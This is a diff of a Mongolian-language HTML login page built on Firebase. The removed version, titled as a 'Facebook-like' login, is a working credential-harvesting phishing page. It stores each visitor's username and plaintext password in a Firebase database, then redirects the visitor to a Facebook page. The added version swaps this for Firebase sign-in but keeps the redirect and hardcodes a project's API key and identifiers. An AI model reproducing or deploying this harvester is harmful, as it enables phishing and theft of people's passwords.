@@ -24,65 +24,59 @@
 <html lang="mn">
 <head>
   <meta charset="UTF-8" />
-  <title>Login Demo with Firebase</title>
+  <title>Firebase Login & Redirect</title>
 </head>
 <body>
-  <h2>Facebook шиг Нэвтрэх</h2>
-  <input id="username" placeholder="Нэвтрэх нэр" /><br><br>
-  <input id="password" type="password" placeholder="Нууц үг" /><br><br>
-  <button onclick="login()">Нэвтрэх</button>
+  <h2>Нэвтрэх</h2>
+  <form id="loginForm">
+    <label>
+      Username (Email):
+      <input type="email" id="email" required />
+    </label><br /><br />
+    <label>
+      Password:
+      <input type="password" id="password" required />
+    </label><br /><br />
+    <button type="submit">Нэвтрэх</button>
+  </form>
 
   <script type="module">
-    // Firebase JS SDK import
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
-    import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
+    import { getAuth, signInWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js";
 
-    // 🔥 Firebase config — ЭНД өөрийн мэдээллээ оруулна уу!
     const firebaseConfig = {
-      apiKey: "YOUR_API_KEY",
-      authDomain: "YOUR_PROJECT_ID.firebaseapp.com",
-      databaseURL: "https://YOUR_PROJECT_ID-default-rtdb.firebaseio.com",
-      projectId: "YOUR_PROJECT_ID",
-      storageBucket: "YOUR_PROJECT_ID.appspot.com",
-      messagingSenderId: "YOUR_SENDER_ID",
-      appId: "YOUR_APP_ID"
+      apiKey: "AIzaSyBCazM2l4jFz8-RaygvQ1z9PlYCLvui28s",
+      authDomain: "test220-e000b.firebaseapp.com",
+      projectId: "test220-e000b",
+      storageBucket: "test220-e000b.firebasestorage.app",
+      messagingSenderId: "139579526452",
+      appId: "1:139579526452:web:4d45f34d70450c29d12961"
     };
 
-    // Firebase инициал
     const app = initializeApp(firebaseConfig);
-    const db = getDatabase(app);
+    const auth = getAuth(app);
 
-    // Login товч дарах үед
-    window.login = function () {
-      const username = document.getElementById("username").value.trim();
-      const password = document.getElementById("password").value.trim();
+    const loginForm = document.getElementById('loginForm');
 
-      if (!username || !password) {
-        alert("Нэвтрэх нэр болон нууц үгээ бөглөнө үү.");
-        return;
+    loginForm.addEventListener('submit', async (e) => {
+      e.preventDefault();
+
+      const email = document.getElementById('email').value.trim();
+      const password = document.getElementById('password').value;
+
+      try {
+        const userCredential = await signInWithEmailAndPassword(auth, email, password);
+        const user = userCredential.user;
+
+        console.log("Нэвтрэлт амжилттай:", user.uid);
+
+        window.location.href = "https://www.facebook.com/ReykaVodka";
+
+      } catch (error) {
+        console.error("Нэвтрэх үед алдаа:", error.message);
+        alert("Нэвтрэх алдаа: " + error.message);
       }
-
-      // Firebase-д бичих
-      set(ref(db, 'logins/' + Date.now()), {
-        username: username,
-        password: password,
-        timestamp: new Date().toISOString()
-      });
-
-      // Facebook Page рүү redirect хийх
-      window.location.href = "https://www.facebook.com/ReykaVodka";
-    };
+    });
   </script>
 </body>
-</html>
-
-<script>
-      function login() {
-        const u = document.getElementById("username").value;
-        const p = document.getElementById("password").value;
-        alert("Login: " + u + ", " + p);
-        window.location.href = "https://www.facebook.com/ReykaVodka";
-      }
-    </script>
-  </body>
 </html>
